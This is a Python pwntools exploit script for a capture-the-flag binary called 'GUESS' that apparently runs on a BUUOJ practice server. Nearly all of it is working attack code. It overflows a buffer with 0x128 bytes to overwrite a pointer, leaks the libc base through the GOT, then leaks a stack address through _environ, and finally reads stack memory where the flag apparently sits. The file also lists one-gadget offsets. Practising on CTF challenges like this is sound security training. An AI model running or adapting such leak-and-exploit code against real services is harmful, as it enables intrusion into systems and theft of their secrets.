import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='GUESS'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',27608)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		io.sendlineafter("flag\n", 'a' * 0x128 + p64(elf.got['__libc_start_main']))
		libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['__libc_start_main']
		info("libc: {:#x}".format(libc.address))


		#  gdb.attach(io, "b *0x400B23\nc")
		#  pause()
		io.sendlineafter("flag\n", 'a' * 0x128 + p64(libc.sym['_environ']))
		stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0'))
		info("stack: {:#x}".format(stack))

		io.sendlineafter("flag\n", 'a' * 0x128 + p64(stack - 0x168))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue